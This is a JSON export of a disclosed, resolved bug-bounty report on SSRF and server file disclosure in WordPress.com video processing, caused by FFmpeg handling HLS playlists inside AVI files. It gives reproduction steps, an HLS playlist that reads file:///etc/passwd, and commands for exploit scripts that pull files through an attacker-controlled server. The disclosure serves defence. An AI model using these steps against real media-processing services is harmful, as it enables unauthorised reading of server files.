{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2017-06-29T15:29:53.042Z", 
    "voters": [
        "bl4de", 
        "r0x33d", 
        "jensec", 
        "hunter", 
        "ysx", 
        "geekboy", 
        "inhibitor181", 
        "edoverflow", 
        "dataalchemist", 
        "eveeez", 
        "and 30 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "800.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 237381, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "SSRF and local file disclosure in https://wordpress.com/media/videos/ via FFmpeg HLS processing", 
    "is_member_of_team?": null, 
    "vote_count": 40, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2017-07-29T15:29:53.097Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$800", 
    "attachments": [
        {
            "file_name": "http_q.avi", 
            "type": "video/x-msvideo", 
            "id": 191998, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/191/998/738af496dcdfe9140c22388240c08410ab2349d0/http_q.avi?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5B43OTPE%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223507Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDCiDARkX3ArKGaO7%2ByK3A39tqjzyooRkX4qPdNM7MkAemep3r5%2Fh%2B11ZdH6KbZ8q2cgU%2FRMODKRq75fJ6sn%2FkR1fBrPaMFfKsP%2BSLpkSrkbyi968FqbmO6yo59Heb3d1kDMwzaNShj3ou%2Fq9qAc5NWgXlxJtABJqkgxPd5NovxMOsASin8kfBjU8OhOOEnonvd2t16oF509MVoA81P%2Frmr4njIb3UfHzYyccuDQNjHM0qV7B57bCKQeIuO%2FzLl7au%2FWR2v6R6bwK6fGUYVbcnAam9GqobWJnMl6NFbipNSdmUzB5%2BglRYaYeGXxbgxseM7SSFeehfzbywUoHEf4Ve61V1e90uyx3M0Krbm5QjS5gNgwErj0g2rC2mkrl2q%2B9ADfOzgMAX8fUODFalEv4gZf0ZKuLhpmAzEapJE5f%2BarcSkdn5b0ddy4Wa2vdsZ6lQ5NOez8qkcnaBEJZLnv3YGHyInLrIaUkqlq4iavZpr4f5Al5PueqIzLuItn5ztJjfvCu5dDIplWP0eo6r%2BIUCKsDwUNkRSgWCtJbCfl%2BPF3PKHjvnmVEBawLZlpXvaOGUvA%2FKYb2cGGXn89CPjYlwpWCj2J8Z%2B0okbim4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f525188c4fdbc5096e6564c3b6e03c63007c42c0177243b9a2a781b570039e70"
        }, 
        {
            "file_name": "file_reading_server.py", 
            "type": "text/x-python", 
            "id": 191999, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/191/999/49f0bed12d5d9e4792c9ca1e2933608f1adc692e/file_reading_server.py?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5B43OTPE%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223507Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDCiDARkX3ArKGaO7%2ByK3A39tqjzyooRkX4qPdNM7MkAemep3r5%2Fh%2B11ZdH6KbZ8q2cgU%2FRMODKRq75fJ6sn%2FkR1fBrPaMFfKsP%2BSLpkSrkbyi968FqbmO6yo59Heb3d1kDMwzaNShj3ou%2Fq9qAc5NWgXlxJtABJqkgxPd5NovxMOsASin8kfBjU8OhOOEnonvd2t16oF509MVoA81P%2Frmr4njIb3UfHzYyccuDQNjHM0qV7B57bCKQeIuO%2FzLl7au%2FWR2v6R6bwK6fGUYVbcnAam9GqobWJnMl6NFbipNSdmUzB5%2BglRYaYeGXxbgxseM7SSFeehfzbywUoHEf4Ve61V1e90uyx3M0Krbm5QjS5gNgwErj0g2rC2mkrl2q%2B9ADfOzgMAX8fUODFalEv4gZf0ZKuLhpmAzEapJE5f%2BarcSkdn5b0ddy4Wa2vdsZ6lQ5NOez8qkcnaBEJZLnv3YGHyInLrIaUkqlq4iavZpr4f5Al5PueqIzLuItn5ztJjfvCu5dDIplWP0eo6r%2BIUCKsDwUNkRSgWCtJbCfl%2BPF3PKHjvnmVEBawLZlpXvaOGUvA%2FKYb2cGGXn89CPjYlwpWCj2J8Z%2B0okbim4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1259689482cafef9ee816d732255c87a624c09226d64a614d3cb0a4bf84c50a9"
        }
    ], 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2017-06-06T21:59:30.631Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-06T21:59:30.631Z", 
            "actor": {
                "username": "vortfu", 
                "url": "/vortfu", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/982/b80411c54ee08b9579811d3427a54368f8d03d09_medium.png?1422255349"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "automattic", 
            "message": "Thanks for the report. We're currently investigating the issue and will get back to you with any updates.", 
            "markdown_message": "<p>Thanks for the report. We&#39;re currently investigating the issue and will get back to you with any updates.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1736027, 
            "genius_execution_id": null
        }, 
        {
            "attachments": [
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/192/115/203df62ed08576396f9d87acd420bf51ac6ab7f1/gen_avi.py?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5B43OTPE%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223507Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDCiDARkX3ArKGaO7%2ByK3A39tqjzyooRkX4qPdNM7MkAemep3r5%2Fh%2B11ZdH6KbZ8q2cgU%2FRMODKRq75fJ6sn%2FkR1fBrPaMFfKsP%2BSLpkSrkbyi968FqbmO6yo59Heb3d1kDMwzaNShj3ou%2Fq9qAc5NWgXlxJtABJqkgxPd5NovxMOsASin8kfBjU8OhOOEnonvd2t16oF509MVoA81P%2Frmr4njIb3UfHzYyccuDQNjHM0qV7B57bCKQeIuO%2FzLl7au%2FWR2v6R6bwK6fGUYVbcnAam9GqobWJnMl6NFbipNSdmUzB5%2BglRYaYeGXxbgxseM7SSFeehfzbywUoHEf4Ve61V1e90uyx3M0Krbm5QjS5gNgwErj0g2rC2mkrl2q%2B9ADfOzgMAX8fUODFalEv4gZf0ZKuLhpmAzEapJE5f%2BarcSkdn5b0ddy4Wa2vdsZ6lQ5NOez8qkcnaBEJZLnv3YGHyInLrIaUkqlq4iavZpr4f5Al5PueqIzLuItn5ztJjfvCu5dDIplWP0eo6r%2BIUCKsDwUNkRSgWCtJbCfl%2BPF3PKHjvnmVEBawLZlpXvaOGUvA%2FKYb2cGGXn89CPjYlwpWCj2J8Z%2B0okbim4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=acd2be17e5cb808e8c40cb0168d6c693aa2c963daac4f1b34644662f923e4551", 
                    "type": "text/x-python", 
                    "id": 192115, 
                    "filename": "gen_avi.py"
                }
            ], 
            "automated_response": false, 
            "created_at": "2017-06-07T03:24:01.536Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-07T03:25:38.107Z", 
            "actor": {
                "username": "neex", 
                "url": "/neex", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/014/987/2ccd94531121f08ef8fa152e6683a7ab0b7334c0_medium.gif?1500000934"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "automattic", 
            "message": "Hello, \n\nI've also found very similar ffmpeg-related issue in cloudup.com. It also results in file read. \n\nTo reproduce it, do following:\n\n1. Generate an AVI file using gen_avi.py (attached) like this `python3 gen_avi.py file:///etc/passwd output.avi`.\n2. Upload \"output.avi\" to Cloudup.\n3. Wait until the conversion finishes.\n4. Play the video. You'll the the contents of /etc/passwd from some conversion instance.\n\nYou can replace /etc/passwd with another file. Example video is located at https://cloudup.com/cknCzklOPnr .\n\nA little note about how it works:\n\nAs in previous example, the script creates an AVI that contains an HLS playlist. The playlist generated by this script looks like this:\n\n```\n#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:1.0\n/some/txt/file.txt\n#EXTINF:1.0\nfile:///etc/passwd\n#EXT-X-ENDLIST\n```\n\nThere are several things to note about the way HLS playlists are processed:\n\n1. To process a playlist ffmpeg concatenates all segments and processes it as single file.\n2. To determine the type of this file FFmpeg uses the first segment of the playlist.\n3. FFmpeg processes txt files in a special way. It tries to show a screen capture of a tty printing this file.\n\nSo, when FFmpeg sees playlist as above, it determines the type of whole file as .txt, then concatenates its' content with the contents of /etc/passwd, and then \"plays\" it by drawing a tty that shows the contents.\n\n\nPlease don't hesitate to ask me if you have any questions!", 
            "markdown_message": "<p>Hello, </p>\n\n<p>I&#39;ve also found very similar ffmpeg-related issue in cloudup.com. It also results in file read. </p>\n\n<p>To reproduce it, do following:</p>\n\n<ol>\n<li>Generate an AVI file using gen_avi.py (attached) like this <code>python3 gen_avi.py file:///etc/passwd output.avi</code>.</li>\n<li>Upload &quot;output.avi&quot; to Cloudup.</li>\n<li>Wait until the conversion finishes.</li>\n<li>Play the video. You&#39;ll the the contents of /etc/passwd from some conversion instance.</li>\n</ol>\n\n<p>You can replace /etc/passwd with another file. Example video is located at <a title=\"https://cloudup.com/cknCzklOPnr\" href=\"/redirect?signature=cf3efffccf8516350c17efda761a0aa881406d4f&amp;url=https%3A%2F%2Fcloudup.com%2FcknCzklOPnr\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://cloudup.com/cknCzklOPnr</span><i class=\"icon-external-link\"></i></a> .</p>\n\n<p>A little note about how it works:</p>\n\n<p>As in previous example, the script creates an AVI that contains an HLS playlist. The playlist generated by this script looks like this:</p>\n<pre class=\"highlight plaintext\"><code>#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:1.0\n/some/txt/file.txt\n#EXTINF:1.0\nfile:///etc/passwd\n#EXT-X-ENDLIST\n</code></pre>\n<p>There are several things to note about the way HLS playlists are processed:</p>\n\n<ol>\n<li>To process a playlist ffmpeg concatenates all segments and processes it as single file.</li>\n<li>To determine the type of this file FFmpeg uses the first segment of the playlist.</li>\n<li>FFmpeg processes txt files in a special way. It tries to show a screen capture of a tty printing this file.</li>\n</ol>\n\n<p>So, when FFmpeg sees playlist as above, it determines the type of whole file as .txt, then concatenates its&#39; content with the contents of /etc/passwd, and then &quot;plays&quot; it by drawing a tty that shows the contents.</p>\n\n<p>Please don&#39;t hesitate to ask me if you have any questions!</p>\n", 
            "type": "Activities::Comment", 
            "id": 1736596, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-20T17:32:43.107Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-20T17:32:43.107Z", 
            "actor": {
                "username": "neex", 
                "url": "/neex", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/014/987/2ccd94531121f08ef8fa152e6683a7ab0b7334c0_medium.gif?1500000934"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "automattic", 
            "message": "Hi there,\n\nAny update on this? \n\nIn case you have trouble with reproducing the issue, I will be glad to answer your questions.", 
            "markdown_message": "<p>Hi there,</p>\n\n<p>Any update on this? </p>\n\n<p>In case you have trouble with reproducing the issue, I will be glad to answer your questions.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1768977, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-26T21:05:48.878Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-26T21:05:48.878Z", 
            "actor": {
                "username": "xknown", 
                "url": "/xknown", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "automattic", 
            "message": "Hi. Sorry for the delayed response. We deployed some fixes to address the security issues you mentioned for the WordPress.com video service. Can you please confirm you are not longer able to reproduce them?\n\nAs for the problem you mention in Cloudup, we use a third-party transcoding service. It doesn't affect our infrastructure.", 
            "markdown_message": "<p>Hi. Sorry for the delayed response. We deployed some fixes to address the security issues you mentioned for the WordPress.com video service. Can you please confirm you are not longer able to reproduce them?</p>\n\n<p>As for the problem you mention in Cloudup, we use a third-party transcoding service. It doesn&#39;t affect our infrastructure.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1782586, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-26T22:04:19.496Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-26T22:04:19.496Z", 
            "actor": {
                "username": "neex", 
                "url": "/neex", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/014/987/2ccd94531121f08ef8fa152e6683a7ab0b7334c0_medium.gif?1500000934"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "automattic", 
            "message": "Yep seems like it's fixed.", 
            "markdown_message": "<p>Yep seems like it&#39;s fixed.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1782745, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "neex", 
                "url": "/neex"
            }, 
            "created_at": "2017-06-29T15:10:36.460Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-29T15:11:03.976Z", 
            "actor": {
                "username": "xknown", 
                "url": "/xknown", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "automattic", 
            "message": "Thanks again for the report. Marking this as resolved.", 
            "markdown_message": "<p>Thanks again for the report. Marking this as resolved.</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1791607, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2017-06-29T15:14:52.489Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-29T15:14:52.489Z", 
            "actor": {
                "url": "/automattic", 
                "profile": {
                    "name": "Automattic"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/111/23288d0462873e4b825f725d8480e850c7c47549_medium.png?1396031864"
                }
            }, 
            "team_handle": "automattic", 
            "bonus_amount": "50.0", 
            "bounty_amount": "750.0", 
            "collaborator": {
                "username": "neex", 
                "url": "/neex"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 1791614, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-29T15:29:53.061Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-29T15:29:53.061Z", 
            "actor": {
                "username": "neex", 
                "url": "/neex", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/014/987/2ccd94531121f08ef8fa152e6683a7ab0b7334c0_medium.gif?1500000934"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "automattic", 
            "first_to_agree": true, 
            "message": "That would be nice to disclose this to show the danger of running ffmpeg without restricting network access.", 
            "markdown_message": "<p>That would be nice to disclose this to show the danger of running ffmpeg without restricting network access.</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1791635, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-07-29T15:30:07.233Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-07-29T15:30:07.233Z", 
            "actor": {
                "url": "/automattic", 
                "profile": {
                    "name": "Automattic"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/111/23288d0462873e4b825f725d8480e850c7c47549_medium.png?1396031864"
                }
            }, 
            "team_handle": "automattic", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1876094, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "neex", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/neex", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/014/987/6027515c59a27190dc161058227d2376db8712be_small.gif?1500000934"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 18, 
        "name": "Information Disclosure"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -42793514.18256088, 
    "disclosed_at": "2017-07-29T15:30:07.191Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/237381", 
    "created_at": "2017-06-06T21:13:33.946Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<h3 id=\"summary\">Summary</h3>\n\n<p>FFmpeg is a video encoding software that appears to be used by wordpress.com for video processing (for paid accounts). FFmpeg is known to process HLS playlists that may contain references to external files. I was able to fire this feature using GAB2 subtitle chunks inside an AVI file. After that, I was able to retrieve conversion nodes&#39; local files and fire SSRF requests.</p>\n\n<h1 id=\"note-that-the-avi-file-attached-is-not-a-screen-capture-of-the-exploitation-process-but-the-exploit-itself-do-not-try-to-play-it\">Note that the AVI file attached is not a screen capture of the exploitation process, but the exploit itself. Do not try to play it!</h1>\n\n<h3 id=\"reproduction-steps-for-ssrf\">Reproduction steps for SSRF</h3>\n\n<ol>\n<li>Open attached file <code>http_q.avi</code> in a hex editor and find http link (currently it&#39;s <code>http://45.55.40.92/ssrf_test</code>). Modify it so it points to a server under your control. <strong>You need to keep binary layout of the file, so you might want to add or remove some <code>#</code>s from the comment on the line below</strong>\n</li>\n<li>Go to <a title=\"https://wordpress.com/media/videos/\" href=\"/redirect?signature=39d1ce3e88ee0cfca077d46f6dafa1b4c15d30ff&amp;url=https%3A%2F%2Fwordpress.com%2Fmedia%2Fvideos%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://wordpress.com/media/videos/</span><i class=\"icon-external-link\"></i></a>&lt;your blog&gt;. <strong>You need paid account to make this work</strong>. Upload the resulting video, then select it, click &quot;Edit&quot; and wait a little bit.</li>\n<li>You&#39;ll receive an HTTP request to your server from some server inside automattic. In the access log, you&#39;ll see an entry like this:</li>\n</ol>\n<pre class=\"highlight plaintext\"><code>   192.0.87.12 - - [06/Jun/2017:21:42:35 +0200] &quot;GET /test_ssrf HTTP/1.1&quot; 200 117 &quot;-&quot; &quot;Lavf/56.25.101&quot;\n</code></pre>\n<p>According to whois information, 192.0.87.12 belongs to Automattic, Inc.</p>\n\n<h3 id=\"reproduction-steps-for-local-file-disclosure\">Reproduction steps for local file disclosure</h3>\n\n<p>Reading files is a little bit trickier --- it uses FFmpeg&#39;s ability to concatinate all segments of an HLS playlist into another playlist. I wrote a script that exploits this issue, <code>file_reading_server.py</code> (attached to the report). You&#39;ll need to run it on any server under your control  (of course, the script doesn&#39;t need to be run on the target server, it will use the SSRF &amp; HLS playlists to retrieve files from it). </p>\n\n<ol>\n<li>Get a droplet/VPS/whatever with an external IP. Launch my script like this: <code>python3 file_reading_server.py --external-addr &lt;external-ip-of-your-server&gt; --port 8080</code> (you&#39;ll need python3.5).</li>\n<li>As in SSRF repro step 1, modify <code>http_q.avi</code> so the link inside it will point to your server and be like this: <code>http://&lt;external-ip-of-your-server&gt;:8080/initial.m3u?filename=/etc/passwd</code>. You can replace <code>/etc/passwd</code> with another filename if you want.</li>\n<li>As in SSRF repro step 2, upload the resulting file to wordpress.com and click &quot;Edit&quot;. After a while, some debug output of my script will be printed to console (because of SSRF requests). Wait until the output stops. Then check the working dir of the script. It will contain a file with name like this: <code>&lt;some random string&gt;_&lt;filename-without-slashes&gt;</code>. The contents of this file was received from the node that runs FFmpeg.</li>\n</ol>\n\n<p>Using this approach, I was able to dump <code>/etc/issue</code>:</p>\n<pre class=\"highlight plaintext\"><code>Debian GNU/Linux 8 \\n \\l\n</code></pre>\n<p>and <code>/etc/hostname</code>:</p>\n<pre class=\"highlight plaintext\"><code>tc1.videos.dca.wordpress.com\n</code></pre>", 
    "vulnerability_information": "### Summary\n\nFFmpeg is a video encoding software that appears to be used by wordpress.com for video processing (for paid accounts). FFmpeg is known to process HLS playlists that may contain references to external files. I was able to fire this feature using GAB2 subtitle chunks inside an AVI file. After that, I was able to retrieve conversion nodes' local files and fire SSRF requests.\n\n# Note that the AVI file attached is not a screen capture of the exploitation process, but the exploit itself. Do not try to play it!\n\n### Reproduction steps for SSRF\n\n1. Open attached file `http_q.avi` in a hex editor and find http link (currently it's `http://45.55.40.92/ssrf_test`). Modify it so it points to a server under your control. **You need to keep binary layout of the file, so you might want to add or remove some `#`s from the comment on the line below**\n2. Go to https://wordpress.com/media/videos/<your blog>. **You need paid account to make this work**. Upload the resulting video, then select it, click \"Edit\" and wait a little bit.\n3. You'll receive an HTTP request to your server from some server inside automattic. In the access log, you'll see an entry like this:\n   \n   ```\n   192.0.87.12 - - [06/Jun/2017:21:42:35 +0200] \"GET /test_ssrf HTTP/1.1\" 200 117 \"-\" \"Lavf/56.25.101\"\n   ```\n\n   According to whois information, 192.0.87.12 belongs to Automattic, Inc.\n    \n    \n### Reproduction steps for local file disclosure\n\nReading files is a little bit trickier --- it uses FFmpeg's ability to concatinate all segments of an HLS playlist into another playlist. I wrote a script that exploits this issue, `file_reading_server.py` (attached to the report). You'll need to run it on any server under your control  (of course, the script doesn't need to be run on the target server, it will use the SSRF & HLS playlists to retrieve files from it). \n\n1. Get a droplet/VPS/whatever with an external IP. Launch my script like this: `python3 file_reading_server.py --external-addr <external-ip-of-your-server> --port 8080` (you'll need python3.5).\n2. As in SSRF repro step 1, modify `http_q.avi` so the link inside it will point to your server and be like this: `http://<external-ip-of-your-server>:8080/initial.m3u?filename=/etc/passwd`. You can replace `/etc/passwd` with another filename if you want.\n3. As in SSRF repro step 2, upload the resulting file to wordpress.com and click \"Edit\". After a while, some debug output of my script will be printed to console (because of SSRF requests). Wait until the output stops. Then check the working dir of the script. It will contain a file with name like this: `<some random string>_<filename-without-slashes>`. The contents of this file was received from the node that runs FFmpeg.\n\n\nUsing this approach, I was able to dump `/etc/issue`:\n```\nDebian GNU/Linux 8 \\n \\l\n``` \n\nand `/etc/hostname`:\n```\ntc1.videos.dca.wordpress.com\n```\n", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://automattic.com", 
            "about": "WordPress.com, VaultPress, Akismet, Gravatar, Cloudup, WooCommerce, Polldaddy and more!", 
            "twitter_handle": "", 
            "name": "Automattic"
        }, 
        "handle": "automattic", 
        "url": "https://hackerone.com/automattic", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/111/6b5147b71079b286c99869a85682f609f6c617c6_small.png?1396031864", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/111/23288d0462873e4b825f725d8480e850c7c47549_medium.png?1396031864"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 111, 
        "default_currency": "usd"
    }, 
    "is_published": false
}